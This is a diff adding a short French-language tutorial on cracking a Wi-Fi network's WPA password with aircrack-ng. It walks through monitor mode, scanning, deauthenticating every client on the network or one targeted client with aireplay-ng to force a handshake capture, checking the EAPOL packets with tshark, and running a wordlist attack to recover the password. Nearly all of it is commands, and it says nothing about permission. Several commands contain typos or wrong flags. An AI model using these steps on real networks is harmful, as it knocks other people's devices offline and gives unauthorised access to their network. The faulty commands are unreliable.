@@ -1,0 +1,46 @@
+Tuto aircrak-ng : 		
+		avoir aircrack-ng en faisant : sudo apt install aircrack-ng 
+		avoir tshark en faisant : sudo apt install tshark
+		
+		
+premierement trouver le nom exacte de notre interface wifi (wlp....)
+
+wlp2s0
+
+ensuite réaliser un : airmon-ng start [interface] (surement il y aura des process a kill . donc faire : sud kill [numéro du process]
+
+(cela pour mettre en mode monitor)
+
+ensuite écouter nos wifi au alentours : sudo airodump-ng [interface]   -->(pas oublier de mettre le “mon” a la fin pour dire que c'est en monitoring mode  
+
+trouver le chanel du reseau wifi cible en regardant les ESSID 
+
+faire la mme chose avec un -c chanel pour spécifier le channel : 
+sudo airodump-ng [interface] -c [channel]
+
+Ensuite afin d'écouter les communication réseau , je vais venir faire un deauth wifi Hack avec : 
+
+sudo aireplay-ng -0 (deauth) 2 (number deauth packet) [interface]   
+-→ ici avec ceytte commande je peux deautgh tout les appareilles du réseau ou alors je peux chercher à cibler uniquement les appareils que je veux deauth avec cette commande : 
+
+sudo aireplay -0 (deauth ) 2 (number deauth packet) -a [BSSID ap] -c  [MAC client] [notre interface wifi]
+
+On va probablement devoir couper la commande et la relancer une deuxième fois afin de capter un handshake . Pour cela , je vais dans un second terminal on va lancer en background la commande suivant :
+
+sudo airodump-ng [interface] -c [channel] -w output 
+
+Une fois le handshake optenue , la commande deauth vas s'arreter et on le verra sur l'affichage du airodump .
+
+On peut ensuite arreter le airodump.
+
+Maintenant si l'on fais un “ls” on devrait trouver des paquet du nom de “output” mais sous des extensions différente . on va alors chercher le paquet .cap afin de l'utiliser dans tshark et trouver les paquet de type eapol ( handshake du wifi) . on va donc verifier que l'on a les paquet de 1 a 4 de l'echange entre les entités qui se sont reconnecter avec cette commande : 
+
+tshark -t output-01.cap eapol
+
+on vas maintenant le cracker !!!
+
+aircrack-ng output-01.cap -w [worldlist]
+
+une fois tout finis , tu as le mots de passe !!!  Bien jouer maintenant pour stopper le mode monitoring faire :
+
+sudo airmon-ng stop [interface avec le mon]
